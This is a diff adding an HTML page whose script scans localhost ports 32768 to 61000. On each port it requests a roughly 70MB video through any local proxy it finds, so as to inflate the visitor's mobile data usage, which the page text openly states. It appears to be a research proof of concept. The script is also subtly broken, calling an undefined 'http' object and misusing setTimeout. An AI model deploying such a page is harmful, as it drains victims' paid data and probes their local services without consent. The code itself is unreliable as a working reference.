@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Video Test</title>
+</head>
+<body id="body">
+We are inflating your 3G/4G/WiFi data by enumerating ports from 32768 to 61000 to load a video (around 70MB).
+<div id='message'></div>
+<script type="text/javascript">
+    var HOST = "http://127.0.0.1";
+    var START_PORT = 32768;
+    var END_PORT = 61000;
+
+    function ping(port) {
+        var xhr = new XMLHttpRequest();
+        var url = HOST + ':' + port + '/https://2459d6dc103cb5933875-c0245c5c937c5dedcca3f1764ecc9b2f.ssl.cf2.rackcdn.com/sec16/xiao.mp4';
+        http.open("GET", url, true);
+        xhr.send();
+    }
+
+    var port;
+    for (port = START_PORT; port <= END_PORT; port++) {
+        document.getElementById("message").innerHTML = port + "/" + END_PORT;
+        setTimeout(ping(port), 100);
+    }
+</script>
+</body>
+</html>
